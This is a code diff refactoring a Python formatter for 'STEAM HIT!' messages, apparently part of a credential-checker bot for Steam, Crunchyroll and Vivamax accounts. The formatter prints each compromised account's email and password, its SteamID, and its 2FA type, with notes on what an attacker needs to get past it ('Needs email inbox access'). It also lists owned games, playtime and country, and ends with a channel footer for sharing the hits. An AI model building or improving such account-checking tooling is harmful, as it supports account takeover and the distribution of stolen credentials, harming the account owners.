@@ -1208,17 +1208,7 @@ def format_single_result(result, user_plan="FREE", mode="Crunchyroll"):
     """Mode-aware formatting: Crunchyroll keeps original tiered look, Vivamax gets rich display"""
     country_code = result.get('country', 'ZZ').upper()
     flag = REGION_HINTS.get(country_code, "🌍")
-
-    country_names = {
-        "BR": "Brazil", "US": "United States", "MX": "Mexico", "CL": "Chile",
-        "FR": "France", "DE": "Germany", "IT": "Italy", "ES": "Spain",
-        "GB": "United Kingdom", "CA": "Canada", "AU": "Australia",
-        "AR": "Argentina", "CO": "Colombia", "PE": "Peru", "UY": "Uruguay",
-        "ZA": "South Africa", "TR": "Turkey", "NO": "Norway", "NZ": "New Zealand",
-        "CR": "Costa Rica", "PH": "Philippines", "ZZ": "Unknown",
-    }
-    country_name = country_names.get(country_code, country_code)
-    country_display = f"{country_name} {flag}"
+    country_display = f"{country_code} {flag}" if country_code not in ["ZZ", "UNKNOWN", ""] else f"Unknown 🌍"
 
     if not result.get('success', False):
         return f"""
@@ -1233,50 +1223,48 @@ Try another account!
 
     expiry_display = get_days_remaining(result.get('expiry')) if result.get('expiry') else 'N/A'
 
+    # ==================== STEAM ====================
     if mode == "Steam":
-        if result.get('twofa'):
-            text = f"""
-✅ <b>STEAM HIT!</b>
+        # Base header (same for both 2FA and normal)
+        text = f"""✅ <b>STEAM HIT!</b>
 
 📧 <b>Email:</b> <code>{result['email']}</code>
 🔑 <b>Password:</b> <code>{result['password']}</code>
-🆔 <b>SteamID:</b> <code>{result.get('steamid','N/A')}</code>
-━━━━━━━━━━━━━━━━━━━━━━━━
-🔐 <b>2FA Type:</b> <code>{result.get('twofa_type', 'Unknown')}</code>
-📝 <b>Note:</b> {"Needs TOTP authenticator app" if result.get('twofa_type') == 'Authenticator' else "Needs email inbox access" if result.get('twofa_type') == 'Email Guard' else "Device confirmation needed"}
-🌍 <b>Country:</b> {result.get('country', 'Unknown')}
-━━━━━━━━━━━━━━━━━━━━━━━━
-Channel: {CHANNEL_USERNAME}
-    """.strip()
-
-        else:
-            text = f"""
-✅ <b>STEAM HIT!</b>
-
-📧 <b>Email:</b> <code>{result['email']}</code>
-🔑 <b>Password:</b> <code>{result['password']}</code>
-🆔 SteamID: <code>{result.get('steamid','N/A')}</code>
+🆔 <b>SteamID:</b> <code>{result.get('steamid', 'N/A')}</code>
 ━━━━━━━━━━━━━━━━━━━━━━━━"""
-        # Games section with Family View note
+
+        # 2FA section
+        if result.get('twofa'):
+            twofa_type = result.get('twofa_type', 'Unknown')
+            if twofa_type == 'Authenticator':
+                note = "Needs TOTP authenticator app"
+            elif twofa_type == 'Email Guard':
+                note = "Needs email inbox access"
+            else:
+                note = "Device confirmation needed"
+            text += f"\n🔐 <b>2FA Type:</b> <code>{twofa_type}</code>"
+            text += f"\n📝 <b>Note:</b> {note}"
+            text += "\n━━━━━━━━━━━━━━━━━━━━━━━━"
+
+        # Games section (shows for BOTH 2FA and normal hits)
         if result.get('games_count') is not None:
             if result['games_count'] == 0:
-                text += "\n🎮 <b>Games Owned:</b> <code>0</code> <i>(Family View / Private)</i>"
+                text += "\n🎮 <b>Games Owned:</b> <code>0</code> <i>(Private/Family View)</i>"
             else:
                 text += f"\n🎮 <b>Games Owned:</b> <code>{result['games_count']}</code>"
-            
+
             if result.get('total_playtime', 0) > 0:
                 text += f"\n⏳ <b>Total Playtime:</b> <code>{result['total_playtime']:,} hours</code>"
-            
+
             if result.get('games'):
                 text += "\n🔥 <b>Top Games:</b>"
                 for game in result['games'][:10]:
                     text += f"\n   • {game['name']} ({game['playtime_hours']}h)"
-        text += f"""\n
-🌍 <b>Country:</b> {result.get('country', 'Unknown')}
 
-━━━━━━━━━━━━━━━━━━━━━━━━
-Channel: {CHANNEL_USERNAME}
-        """.strip()
+        # Country + footer (always at the bottom, only once)
+        text += f"\n🌍 <b>Country:</b> {country_display}"
+        text += f"\n━━━━━━━━━━━━━━━━━━━━━━━━"
+        text += f"\nChannel: {CHANNEL_USERNAME}"
         return text
 
     if mode == "Vivamax":
